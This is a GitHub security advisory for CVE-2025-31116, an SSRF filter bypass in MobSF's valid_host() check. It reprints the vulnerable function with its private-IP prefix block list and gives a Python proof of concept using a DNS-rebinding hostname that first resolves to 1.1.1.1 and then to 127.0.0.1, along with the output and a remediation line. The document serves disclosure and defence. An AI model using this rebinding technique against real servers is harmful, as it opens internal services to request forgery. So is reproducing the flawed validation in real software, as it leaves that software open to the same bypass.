# [M] Mobile Security Framework (MobSF) has a SSRF Vulnerability fix bypass on assetlinks_check with DNS Rebinding

## Summary
Severity: Medium
Advisory: GHSA-fcfq-m8p6-gw56
CVE: CVE-2025-31116
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:L/I:N/A:L (CVSS_V3)
Published: 2025-03-31
Source: https://github.com/advisories/GHSA-fcfq-m8p6-gw56
Type: github-advisory

## Affected
- PyPI: `mobsf` — affected >=0 <4.3.2

## Details
### Summary

The latest deployed fix for the SSRF vulnerability is through the use of the call `valid_host()`. The code available at lines [/ae34f7c055aa64fca58e995b70bc7f19da6ca33a/mobsf/MobSF/utils.py#L907-L957](https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/ae34f7c055aa64fca58e995b70bc7f19da6ca33a/mobsf/MobSF/utils.py#L907-L957) is vulnerable to SSRF abuse using DNS rebinding technique.

### PoC

The following proof of concept: 

```python
def valid_host(host):
    """Check if host is valid."""
    try:
        prefixs = ('http://', 'https://')
        if not host.startswith(prefixs):
            host = f'http://{host}'
        parsed = urlparse(host)
        domain = parsed.netloc
        path = parsed.path
        if len(domain) == 0:
            # No valid domain
            return False, None
        if len(path) > 0:
            # Only host is allowed
            return False, None
        if ':' in domain:
            # IPv6
            return False, None
        # Local network
        invalid_prefix = (
            '100.64.',
            '127.',
            '192.',
            '198.',
            '10.',
            '172.',
            '169.',
            '0.',
            '203.0.',
            '224.0.',
            '240.0',
            '255.255.',
            'localhost',
            '::1',
            '64::ff9b::',
            '100::',
            '2001::',
            '2002::',
            'fc00::',
            'fe80::',
            'ff00::')
        if domain.startswith(invalid_prefix):
            return False, None
        ip = socket.gethostbyname(domain)
        if ip.startswith(invalid_prefix):
            # Resolve dns to get IP
            return False, None
        return True, ip
    except Exception:
        return False, None

import random
import time
import socket
from urllib.parse import urlparse

if __name__ == '__main__':
    print("Generating random host ...", end=' ')     
    prefix = random.randint(999_999, 9_999_999)
    host = f"{prefix}-make-1.1.1.1-rebindfor30safter1times-127.0.0.1-rr.1u.ms"
    print("Done")
    print(f"Testing with '{host}' ... ", end=" ")
    valid, ip = valid_host(host)
    if valid:
        print(f"Successful Bypass")
        print(f" - Host initially resolved to: {ip}")
        print("Sleeping for 1 second ...")
        time.sleep(1)
        print(f" - Second use host will be resolved to: {socket.gethostbyname(host)}")
        print(f" - Third use host will be resolved to: {socket.gethostbyname(host)}")
        print("Sleeping for 30 seconds ...")
        time.sleep(30)
    else:
        print(f"Invalid host")

```

Yields : 

```
$ python3 poc.py
Generating random host ... Done
Testing with '5084216-make-1.1.1.1-rebindfor30safter1times-127.0.0.1-rr.1u.ms' ...  Successful Bypass
 - Host initially resolved to: 1.1.1.1
Sleeping for 1 second ...
 - Second use host will be resolved to: 127.0.0.1
 - Third use host will be resolved to: 127.0.0.1
Sleeping for 30 seconds ...
```

Which generate an initlal random url that leverages dns rebinding after 1 time host resolution and remains to that IP for 30 seconds.
As you can notice the initial resolution was pointing to `1.1.1.1`. The second time the IP was resolved to `127.0.0.1`. Such an attack could be adjusted for other IP addresses.

### Impact

The usual impact of Server-side request forgery.

### Remediation 

- Avoid the use of `socket.gethostbyname()` since it issues and DNS query.

## References
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-fcfq-m8p6-gw56
- https://nvd.nist.gov/vuln/detail/CVE-2025-31116
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/4b8bab5a9858c69fe13be4631b82d82186e0d3bd
- https://github.com/MobSF/Mobile-Security-Framework-MobSF
- https://github.com/pypa/advisory-database/tree/main/vulns/mobsf/PYSEC-2025-48.yaml
